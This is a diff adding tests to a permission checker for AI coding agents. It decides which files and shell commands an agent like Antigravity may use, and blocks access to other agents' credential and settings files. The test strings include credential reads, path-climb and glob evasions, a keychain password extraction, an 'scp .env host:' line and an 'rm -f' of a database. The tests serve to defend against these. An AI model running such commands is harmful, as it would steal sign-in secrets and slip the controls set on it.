@@ -368,4 +368,124 @@ test("namesAgentSettingsFile knows your agents' sign-in and settings files by na
   for (const text of ["process.env.HOME", "tsconfig.json", "input_tokens", "x.jsonl", ".envrc", "credit.txt"]) {
     expect([text, namesAgentSettingsFile(`cat ${text}`)]).toEqual([text, false]);
   }
+  // The names only the file-by-file rule reads are not among them: what an agent that asks first is refused is as it was.
+  for (const name of ["mcp_config.json", "hooks.json", "mcp-auth.json", "opencode.json", "managed-settings.json"]) {
+    expect([name, namesAgentSettingsFile(`cat "/x/${name}"`)]).toEqual([name, false]);
+  }
+});
+
+// An agent that cannot be made to ask first (Antigravity): its own folder with what it ships with, its
+// settings and its sign-in file; links in there, one to that sign-in and one out to Codex's; other agents' skills and records.
+const gemini = join(home, ".gemini");
+const guide = join(gemini, "antigravity-cli", "builtin", "skills", "antigravity_guide");
+mkdirSync(join(guide, "references"), { recursive: true });
+mkdirSync(join(gemini, "antigravity-cli", "skills"), { recursive: true });
+mkdirSync(join(gemini, "config"), { recursive: true });
+mkdirSync(join(home, ".claude", "skills", "x"), { recursive: true });
+mkdirSync(join(home, ".codex", "sessions", "2026"), { recursive: true });
+writeFileSync(join(guide, "SKILL.md"), "x");
+writeFileSync(join(gemini, "oauth_creds.json"), "{}");
+writeFileSync(join(gemini, "antigravity-cli", "settings.json"), "{}");
+writeFileSync(join(home, ".claude", "skills", "x", "SKILL.md"), "x");
+writeFileSync(join(home, ".codex", "sessions", "2026", "rollout.jsonl"), "{}\n");
+symlinkSync(join(gemini, "oauth_creds.json"), join(gemini, "antigravity-cli", "skills", "linked.md"));
+symlinkSync(join(home, ".codex", "auth.json"), join(gemini, "antigravity-cli", "skills", "out.md"));
+const unasked: ActionContext = { ...accounts, openDirs: [brain], ownAgentDirs: [gemini] };
+const list = (path: string): AppAction => ({ appName: "list_dir", vendorTool: "find_by_name", paths: [path], cwd: workspace });
+
+posixTest("an agent that cannot ask first uses its own folder as in its terminal: what it ships with, its settings, what signs it in, the folder itself", () => {
+  // As agy ran them: the read stopped late on 2026-11-23, what it did in its terminal sessions before, and where it looked next for the plan's tier.
+  for (const path of [join(guide, "SKILL.md"), join(guide, "references", "cli.md"), join(gemini, "antigravity-cli", "settings.json"), join(gemini, "settings.json"),
+    join(gemini, "config", "mcp_config.json"), join(gemini, "GEMINI.md"), join(gemini, "antigravity-cli", "brain", "session-2", "plan.md"), join(gemini, "antigravity-cli", "log", "cli-1.log"),
+    join(gemini, "oauth_creds.json"), join(gemini, "google_accounts.json"), join(gemini, ".env"), join(gemini, "antigravity-cli", "skills", "linked.md")]) {
+    expect([path, decideAction(read(path), unasked).kind]).toEqual([path, "allow"]);
+    // A Bot, and an agent that asks first, as before.
+    expect([path, decideAction(read(path), base).kind]).toEqual([path, "deny"]);
+    expect([path, decideAction(read(path), session).kind]).toEqual([path, "deny"]);
+  }
+  expect(decideAction(list(join(gemini, "antigravity-cli")), unasked).kind).toBe("allow");
+  for (const command of [
+    "ls -la ~/.gemini/ ~/.gemini/antigravity-cli/ 2>/dev/null; cat ~/.gemini/antigravity-cli/settings.json ~/.gemini/settings.json 2>/dev/null | head -n 60 || true",
+    "rg -i \"orchestrator\" apps/ docs/ packages/ ~/.gemini/antigravity-cli/builtin/ 2>/dev/null | head -n 40 || true",
+    `rm -f "$HOME/Library/Application Support/x/data.db" && ls -la ${guide}/references/`,
+    "cd ~/.gemini/antigravity-cli && ls && cat settings.json",
+    "cat \"$HOME/.gemini/config/mcp_config.json\"",
+    "for f in ~/.gemini/antigravity-cli/builtin/skills/*/SKILL.md; do head -5 \"$f\"; done",
+    `python3 -c 'import os; print(os.listdir(os.path.expanduser("~/.gemini/antigravity-cli")))'`,
+    "cat ~/.gemini/oauth_creds.json", "cat ~/.gemini/google_accounts.json ~/.gemini/antigravity-cli/state.json", "cd ~/.gemini && cat oauth_creds.json settings.json",
+    "cat ~/.gemini/antigravity-cli/brain/../../oauth_creds.json",
+    `python3 -c 'import json, os; print(list(json.load(open(os.path.join(os.path.expanduser("~/.gemini"), "oauth_creds.json")))))'`,
+  ]) {
+    expect([command, decideAction(shell(command), unasked)]).toEqual([command, expect.objectContaining({ kind: "allow" })]);
+    expect([command, decideAction(shell(command), base).kind]).toEqual([command, "deny"]);
+  }
+  // Its own folder is its own to change too, as the permission mode has it.
+  expect(decideAction(write(join(gemini, "antigravity-cli", "settings.json")), unasked)).toMatchObject({ kind: "allow", effect: true });
+  expect(decideAction(write(join(gemini, "oauth_creds.json")), { ...unasked, permission: "ask_first" }).kind).toBe("ask");
+  expect(decideAction(write(join(gemini, "antigravity-cli", "skills", "mine", "SKILL.md")), { ...unasked, permission: "ask_first" }).kind).toBe("ask");
+  expect(decideAction(write(join(gemini, "GEMINI.md")), { ...unasked, permission: "read_only" })).toEqual({ kind: "deny", reason: expect.not.stringContaining("credentials") });
+  expect(decideAction(shell("ls ~/.gemini/antigravity-cli"), { ...unasked, permission: "ask_first" }).kind).toBe("ask");
+  expect(decideAction(shell("ls ~/.gemini/antigravity-cli"), { ...unasked, permission: "read_only" })).toEqual({ kind: "deny", reason: expect.not.stringContaining("credentials") });
+});
+
+posixTest("for it the other agents' folders are read as any folder outside, by file or by command", () => {
+  for (const path of [join(home, ".claude", "skills", "x", "SKILL.md"), join(home, ".claude", "CLAUDE.md"), join(home, ".claude", "keybindings.json"), join(home, ".claude"),
+    join(home, ".codex", "sessions", "2026", "rollout.jsonl"), join(home, ".codex", "AGENTS.md"), join(home, ".claude-b", "skills", "y.md"), join(claudeRecords, "-Users-someone-proj", "47ce0671.jsonl")]) {
+    expect([path, decideAction(read(path), unasked).kind]).toEqual([path, "allow"]);
+  }
+  expect(decideAction(list(join(home, ".codex")), unasked).kind).toBe("allow");
+  for (const command of [
+    "ls ~/.claude", "ls \"$HOME/.claude\"", "find ~/.claude -name '*.md'", "cat ~/.codex/sessions/2026/rollout.jsonl", "cd ~/.claude/skills && ls", "wc -l ~/.claude-b/projects/-p/a.jsonl",
+    "D=~/.codex/sessions; ls -t $D | head", "for f in ~/.codex/sessions/*/*.jsonl; do wc -l \"$f\"; done", "ls -t ~/.claude*/projects | head",
+    transcripts, joined,
+    // A sign-in or settings name written as a path of some other place is some other file's.
+    "rg -n contextWindow ~/.claude/projects apps/daemon/config.json", "ls ~/.claude/skills && cat .env", "cat ~/.codex/AGENTS.md packages/x/settings.json",
+  ]) {
+    expect([command, decideAction(shell(command), unasked)]).toEqual([command, expect.objectContaining({ kind: "allow" })]);
+  }
+  // What is built in its own notes for the session reaches no further, whatever else the command names.
+  for (const command of [`cd /tmp && V=$(date) && python3 -c 'import pathlib; pathlib.Path("${brain}/scratch/deploy.sh").write_text("scp .env host:")'`, `cat ${brain}/plan.md && cat .env auth.json`]) {
+    expect([command, decideAction(shell(command), unasked)]).toEqual([command, expect.objectContaining({ kind: "allow" })]);
+  }
+});
+
+posixTest("what signs another agent in or sets it up stays off limits to it", () => {
+  for (const path of [
+    // Sign-in: another agent's, an account's you listed, through a link out of its own folder, the keychains.
+    join(home, ".claude", ".credentials.json"), join(home, ".claude-b", ".credentials.json"), join(home, ".codex", "auth.json"), join(home, ".grok", "auth.json"),
+    join(home, ".codex", "mcp-oauth-tokens.json"), join(gemini, "antigravity-cli", "skills", "out.md"),
+    join(home, ".local", "share", "opencode", "auth.json"), join(home, ".local", "share", "opencode", "mcp-auth.json"), join(home, "Library", "Keychains", "login.keychain-db"),
+    // Another agent's settings.
+    join(home, ".claude", "settings.json"), join(home, ".claude", "settings.local.json"), join(home, ".claude", "managed-settings.json"), join(home, ".claude.json"),
+    join(home, ".claude.json.backup"), join(home, ".claude", "backups", ".claude.json.backup.1763900000000"), join(home, ".claude", ".mcp.json"), join(home, ".claude-b", "settings.json"),
+    join(home, ".codex", "config.toml"), join(home, ".codex", "work.config.toml"), join(home, ".codex", "hooks.json"), join(home, ".grok", "user-settings.json"),
+    join(home, ".config", "opencode", "opencode.json"), join(claudeRecords, "..", "settings.json"),
+  ]) {
+    expect([path, decideAction(read(path), { ...unasked, permission: "allow_all" }).kind]).toEqual([path, "deny"]);
+  }
+  const py = (body: string) => `python3 -c '\n${body}\n'`;
+  for (const command of [
+    // Named outright, as written or after a climb, through a glob on the folder's name, by a shell handed the command.
+    "cat ~/.codex/auth.json", "cat ~/.claude/settings.json", "cat ~/.claude/projects/-Users-someone-proj/47ce0671.jsonl ~/.claude.json", "cat ~/.gemini/oauth_creds.json ~/.grok/auth.json",
+    "cat ~/.gemini/antigravity-cli/../../.claude/settings.json", `cat ${brain}/../../../../.codex/auth.json`,
+    "cat ~/.claude*/settings.json", "cat ~/.claude*/.credentials.json", "bash -c 'cat ~/.claude/.credentials.json'", "cat ~/.claude-b/settings.json",
+    "cat ~/.gemini/antigravity-cli/skills/out.md", "grep -c x \"$HOME/.codex/auth.json\", done",
+    // Worked from inside the folder or built on it, with such a file's name beside.
+    "cd ~/.codex && cat auth.json", "cd ~/.claude && cat settings.json", "D=~/.codex; cat $D/auth.json", "cat \"$HOME/.codex\"/auth.json", "cd ~/.gemini && ls; cd ~/.grok && cat auth.json",
+    "find ~/.claude -name settings.json -exec cat {} \\; | head; cd ~/.claude && cat .cred*",
+    py(`import os\nprint(open(os.path.expanduser("~/.codex") + "/auth.json").read())`),
+    py(`import os\nprint(open(os.path.join(os.path.expanduser("~/.claude"), "settings.local.json")).read())`),
+    "D=~/.claude/projects; cat ${D%/*}/.credentials.json",
+    // The keychain.
+    "security find-generic-password -s 'Claude Code-credentials' -w",
+  ]) {
+    expect([command, decideAction(shell(command), { ...unasked, permission: "allow_all" })]).toEqual([command, { kind: "deny", reason: expect.stringContaining("credentials") }]);
+  }
+});
+
+posixTest("it reads the other agents' folders, and writes none of them with its file tools", () => {
+  for (const path of [join(home, ".claude", "skills", "x", "SKILL.md"), join(home, ".claude", "CLAUDE.md"), join(home, ".codex", "AGENTS.md"), join(claudeRecords, "-Users-someone-proj", "47ce0671.jsonl"),
+    join(home, ".claude-b", "skills", "y.md"), join(home, ".codex", "auth.json"), join(gemini, "antigravity-cli", "skills", "out.md")]) {
+    expect([path, decideAction(write(path), { ...unasked, permission: "allow_all" })]).toEqual([path, { kind: "deny", reason: expect.stringContaining("credentials") }]);
+  }
 });
